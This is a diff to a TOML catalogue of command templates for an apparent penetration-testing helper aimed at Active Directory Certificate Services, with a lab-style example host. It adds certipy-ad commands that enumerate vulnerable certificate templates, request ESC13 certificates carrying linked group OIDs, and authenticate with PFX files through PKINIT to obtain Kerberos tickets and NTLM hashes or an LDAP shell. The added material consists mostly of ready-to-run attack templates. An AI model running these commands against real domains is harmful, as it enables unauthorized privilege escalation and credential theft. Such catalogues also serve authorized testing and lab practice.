@@ -14,12 +14,39 @@ tags = ["enum"]
 when = "creds.kind == 'plaintext' and target.has_dc"
 
 [[command]]
+id = "adcs.certipy.find.kerberos"
+title = "certipy find — Kerberos (-k, NTLM-off DCs)"
+description = "Use when NTLM is disabled. Set --hostname to DC FQDN (e.g. dc1.ping.htb) and --dc to DC IP. -dc-ip uses {ip}."
+template = "certipy-ad find -u '{user}@{domain}' -p '{password}' -k -dc-ip {ip} -dc-host {hostname} -target {hostname} -ns {ip} -text -stdout -output ca_findings"
+requires = ["certipy-ad"]
+tags = ["enum", "kerberos"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
 id = "adcs.certipy.find_vulnerable"
 title = "certipy find -vulnerable -enabled"
 template = "certipy-ad find -u '{user}@{domain}' -p '{password}' -dc-ip {dc} -vulnerable -enabled -stdout"
 requires = ["certipy-ad"]
 tags = ["enum", "vulnerable"]
 when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "adcs.certipy.find_vulnerable.kerberos"
+title = "certipy find -vulnerable -enabled (Kerberos)"
+description = "Use when NTLM is disabled. Set --hostname to DC FQDN (e.g. dc1.ping.htb) and --dc to DC IP. -dc-ip uses {ip}."
+template = "certipy-ad find -u '{user}@{domain}' -p '{password}' -k -dc-ip {ip} -dc-host {hostname} -target {hostname} -ns {ip} -vulnerable -enabled -stdout"
+requires = ["certipy-ad"]
+tags = ["enum", "vulnerable", "kerberos"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "adcs.certipy.find.kerberos.ccache"
+title = "certipy find — Kerberos from ccache (-k -no-pass)"
+description = "Requires KRB5CCNAME (e.g. after impacket-getTGT). Hostname must be DC FQDN."
+template = "certipy-ad find -u '{user}@{domain}' -k -no-pass -dc-ip {ip} -dc-host {hostname} -target {hostname} -ns {ip} -vulnerable -enabled -stdout"
+requires = ["certipy-ad"]
+tags = ["enum", "vulnerable", "kerberos", "ccache"]
+when = "target.has_dc"
 
 [[command]]
 id = "adcs.certipy.find.hash"
@@ -160,10 +187,20 @@ tags = ["esc11"]
 [[command]]
 id = "adcs.esc13.request"
 title = "certipy ESC13 — request cert with linked group OID"
-template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -ca CA_NAME -template ESC13_TEMPLATE"
+description = "Set -v ca_name=... -v cert_template=... from certipy find (ESC13). NTLM-off DCs: use adcs.esc13.request.kerberos."
+template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -dc-ip {dc} -ca '{ca_name}' -template '{cert_template}'"
 requires = ["certipy-ad"]
 tags = ["esc13"]
-when = "creds.kind == 'plaintext'"
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "adcs.esc13.request.kerberos"
+title = "certipy ESC13 — request linked-policy template (Kerberos)"
+description = "NTLM-off ESC13 enroll. -v ca_name=... -v cert_template=... Optional -v pfx_out=user."
+template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -k -dc-ip {ip} -dc-host {hostname} -target {hostname} -ns {ip} -ca '{ca_name}' -template '{cert_template}' -out '{user}'"
+requires = ["certipy-ad"]
+tags = ["esc13", "kerberos"]
+when = "creds.kind == 'plaintext' and target.has_dc"
 
 # === ESC14 / shadow credentials ===
 
@@ -206,18 +243,29 @@ when = "creds.kind == 'plaintext'"
 [[command]]
 id = "adcs.certipy.auth_with_pfx"
 title = "certipy auth — get TGT + NTLM from PFX"
-template = "certipy-ad auth -pfx target.pfx -dc-ip {dc}"
+description = "Set -v pfx=file.pfx. On NTLM-off DCs prefer adcs.certipy.auth_with_pfx.kerberos (-no-hash)."
+template = "certipy-ad auth -pfx {pfx} -dc-ip {ip} -ns {ip}"
 requires = ["certipy-ad"]
 tags = ["auth"]
 when = "target.has_dc"
 
 [[command]]
+id = "adcs.certipy.auth_with_pfx.kerberos"
+title = "certipy auth — PKINIT TGT from PFX (NTLM-off safe)"
+description = "PKINIT with -no-hash. Set -v pfx=file.pfx (or {user}.pfx in cwd via private overlay wrapper)."
+template = "certipy-ad auth -pfx {pfx} -dc-ip {ip} -ns {ip} -no-hash"
+requires = ["certipy-ad"]
+tags = ["auth", "pkinit", "kerberos"]
+when = "target.has_dc"
+
+[[command]]
 id = "adcs.certipy.auth_with_pfx.no_ntlm"
 title = "certipy auth — PKINIT only (no NTLM exchange)"
-template = "certipy-ad auth -pfx target.pfx -dc-ip {dc} -ldap-shell"
+template = "certipy-ad auth -pfx {pfx} -dc-ip {ip} -ns {ip} -ldap-shell"
 requires = ["certipy-ad"]
 tags = ["auth", "pkinit"]
 when = "target.has_dc"
+interactive = true
 
 [[command]]
 id = "adcs.certipy.cert_extract"
